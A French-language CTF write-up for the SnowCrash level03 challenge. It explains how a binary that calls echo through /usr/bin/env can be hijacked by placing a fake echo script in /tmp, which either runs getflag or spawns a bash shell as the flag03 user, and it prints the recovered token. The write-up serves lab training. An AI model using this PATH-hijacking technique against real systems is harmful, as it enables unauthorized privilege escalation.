# Level03 - Variable d'environnement
Pour résoudre le level03, on nous fournis un fichier level03. On utilise `strings` dessus, et on s'aperçoit que le programme fait appel à echo d'une manière un peu particulière...
```
/usr/bin/env echo Exploit me
```

On passe par l'environnement pour récupérer la variable $PATH, et on s'en sert pour aller chercher echo.

On peut exploiter cet appel en créant un faux programme echo dans `/tmp` qui va se charger d'appeler `getflag` ou de nous ouvrir un `terminal` vers flag03.

Pour se faire, on crée un script dans `/tmp` qu'on appelle `echo`:
```
#!/bin/bash
getflag | wall //Permet de récupérer directement 
               //le flag et de l'afficher sur le terminal avec wall
```
ou
```
#!/bin/bash
/bin/bash //Nous ouvre directement un terminal depuis l'utilisateur flag03
```

On `chmod 777 /tmp/echo` et on exécute `level03`. L'appel d'`echo` se fait avec notre version et nos commandes se lancent bien.

On récupère notre flag
```
flag03@SnowCrash:~$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

On a notre token: `qi0maab88jeaj46qoumi7maus`

